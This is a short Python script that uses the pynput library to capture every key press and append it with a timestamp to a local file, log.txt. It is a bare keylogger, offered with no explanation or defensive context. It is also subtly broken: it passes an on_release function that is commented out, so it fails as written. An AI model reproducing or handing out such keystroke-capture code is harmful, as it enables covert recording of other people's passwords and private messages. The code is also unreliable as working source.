from datetime import datetime
from pynput.keyboard import Key, Listener

def on_press(key):
    print("{0} pressed".format(key))
    write_file(key)

# def on_release(key):
#     if key == Key.esc:
#         return False

def write_file(key):
    with open("log.txt","a") as log_file:
        now = datetime.now()
        dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
        log_file.write(dt_string)
        log_file.write(" ")
        log_file.write(str(key))
        log_file.write("\n")

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
